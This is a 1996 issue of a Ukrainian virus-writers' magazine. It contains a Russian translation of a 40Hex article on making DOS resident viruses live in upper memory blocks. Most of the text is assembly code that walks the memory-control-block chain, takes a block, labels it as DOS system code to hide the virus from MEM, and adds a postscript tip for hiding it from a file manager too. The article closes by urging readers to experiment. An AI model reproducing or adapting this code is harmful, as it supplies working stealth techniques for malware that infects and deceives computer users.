

      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


──────────────────────────────────────────────────────────────────────────────

Перед вами вольный литературный перевод статьи, написанной нашими колегами из
40Hex.

Оригинал:
;-----------------------------------------------------------------------------
40Hex Number 14 Volume 5 Issue 1                                      File 012

        UMB Residency
        By Dark Angel, Phalcon/Skism '95
;-----------------------------------------------------------------------------

Однажды столкнувшись с загрузкой программ в UMB,  я осознал,  что практически
нет вирусов, использующих верхнюю память. А ведь такой метод посадки в память
имеет много преимуществ  и позволяет вирусам легко скрывать свое присутствие.
UMBs (upper memory blocks) занимают память с адресами больше 640K и меньше 1MB
(сегменты от A000 до FFFF). Эта область была зарезервирована для использования
под BIOS и различные аппаратные расширения. Обычно там полно места и программис-
ты нашли простой способ использовать эту память под DOS, распространив цепочку
MCB блоков на эту область. Блоки UMB оказались особенно удобны для загрузки
резидентных программ. Microsoft включила механизм использования UMB в MS-DOS 5.0
и более поздние. Таким образом существует стандартный метод обращения к верхней
памяти.
Формат управляющей структуры UMB блока несколько более сложен, чем формат MCB.

Cмещение  Размер  Описание
  00      BYTE    'Z' если последний в цепочке, иначе 'M'
  01      WORD    Сегмент PSP владельца блока (8 для MSDOS, 0 - свободен)
  03      WORD    Размер блока в параграфах
  05    3 байта   Не используются
  08    8 байт    Имя программы (ASCII) или
                 "SC" - системный код
                 "SD" - данные системы

Метод использования UMB прост для понимания и использования. Aдрес первого
UMB может быть получен через функцию 52h прерывания 21h (get DOS master list
structure), обычно это 9FFF:0000. При выделении блока верхней памяти, объем
доступной памяти в нижних адресах не изменяется (любимые 640k останутся
нетронутыми), а пометив наш блок как видео память или ROM, мы надежно спрячем
вирус от MEM и еже с ним.

Пример, иллюстрирующий данную технику (для RC):

start:          xor     di,di

                mov     ax,3306h                ; получить истинную версию DOS
                int     21h
                inc     al                      ; DOS 4-?
                jz      no_UMBs                 ; UMB нет, а жаль!

                mov     ah,52h                  ; получить DOS master list
                int     21h                     ; structure

                lds     si,es:[bx+12h]          ; указатель на дисковый буфер

                mov     ax,ds:[si+1fh]          ; адрес первого UMB
                inc     ax                      ; (FFFF - если UMB нет)
                jz      no_UMBs
                dec     ax                      ; восстановим AX
search_chain:   mov     ds,ax
                cmp     word ptr [di+1],di      ; используется ли блок?
                jnz     search_next
                cmp     word ptr [di+3],reslength_P ; Хватит ли на вирус и
                ja      handle_MCB                  ; его MCB?
search_next:    cmp     byte ptr [di],'Z'           ; Конец цепочки?
                jz      no_UMBs
                mov     bx,[di+3]               ; перейти к следующему MCB
                inc     ax
                add     ax,bx
                jmp     search_chain

no_UMBs:        mov     ax,cs
                dec     ax                      ; get the MCB for current
                mov     ds,ax                   ; program
                cmp     word ptr [di+3],reslength_P + 1000 ; хватит на
						; программу, вирус и MCB?
                jna     fail_init
                jmp     short handle_MCB	; Берем!

                db      0,'(DA/PS)',0

handle_MCB:     sub     word ptr [di+3],reslength_P + 1 ; cкорректировать
						; размер памяти

                mov     bx,[di+3]               ; получить размер нового блока
                mov     cl,'M'                  ; сделать не последним
                xchg    cl,byte ptr [di]
                inc     ax
                add     ax,bx                   ; переходим к вирусному MCB
                mov     ds,ax
                mov     es,ax

                mov     byte ptr [di],cl        ; Признак конца цепочки
                mov     word ptr [di+1],8       ; Владелец - DOS
                mov     word ptr [di+3],reslength_P ; Проставим размер вируса

                inc     ax                      ; В ds - сегмент вируса
                mov     ds,ax

                or      di,8                    ; Поле имени владельца блока
                mov     ax,'CS'                 ; Спрячемся от MEM,
                stosw                           ; проставив метку системного
                xor     ax,ax                   ; кода DOS
                stosw
                stosw
                stosw				; Нули, нули...

;---------------------------------------------------------------------------
				Перевод - Eternal Maverick.

P.S. Метод применим не только для RC. Заметим, что можно ставить в поле
владельца блока не 8, а 70h - cреда, что делает вирус абсолютно невидимым для
Volcov Commander и, кажется, не должно приводить к неприятным последствиям.
В общем, экспериментируйте! И, да будут пользователи экспериментировать с вами!
